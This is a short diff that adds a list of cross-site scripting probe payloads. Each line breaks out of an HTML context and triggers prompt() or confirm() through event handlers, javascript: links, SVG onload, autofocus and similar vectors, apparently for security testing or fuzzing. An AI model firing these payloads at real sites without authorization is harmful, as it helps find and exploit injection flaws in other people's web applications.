@@ -1,0 +1,18 @@
+</script>"><script>prompt(1)</script>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=prompt(1)>
+"><iframe/src=javascript:prompt(1)>
+"><h1 onclick=prompt(1)>Clickme</h1>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><textarea autofocus onfocus=prompt(1)>
+"><img src=x onerror=confirm`1`>
+"><svg/onload=confirm`1`>
+"><iframe/src=javascript:confirm(1)>
+"><h1 onclick=confirm>Clickme</h1>
+"><a href=javascript:prompt(1)>Clickme</a>
+"><a href="javascript:confirm(1)>Clickme</a>
+"><textarea autofocus onfocus=confirm(1)>
+"><details/ontoggle=confirm`1`>clickmeonchrome
+"><p/id=1 onmousemove=confirm`1`>hoveme
+"><img/src=x onerror=prompt`1`>
+"><h1/ondrag=confirm`1`)>DragMe</h1>
